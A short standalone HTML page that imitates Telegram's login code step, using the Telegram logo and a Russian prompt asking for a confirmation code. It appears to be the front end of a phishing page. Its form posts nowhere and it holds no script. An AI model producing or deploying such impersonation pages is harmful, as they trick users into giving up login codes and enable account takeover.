<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Telegram Code Entry</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #121212;
      color: #ffffff;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: #1e1e1e;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.4);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .logo {
      width: 80px;
      height: auto;
      margin-bottom: 20px;
    }

    h2 {
      margin-bottom: 20px;
      color: #ffffff;
    }

    input[type="text"] {
      width: 100%;
      padding: 12px 15px;
      margin: 10px 0 20px;
      border: 1px solid #444;
      border-radius: 8px;
      font-size: 16px;
      background-color: #2c2c2c;
      color: #ffffff;
    }

    input::placeholder {
      color: #aaaaaa;
    }

    button {
      background-color: #2aabee;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #229bd8;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
    <h2>Введите код</h2>
    <form method="POST" action="#">
      <input type="text" name="code" placeholder="Код подтверждения" required />
      <button type="submit">Продолжить</button>
    </form>
  </div>
</body>
</html>
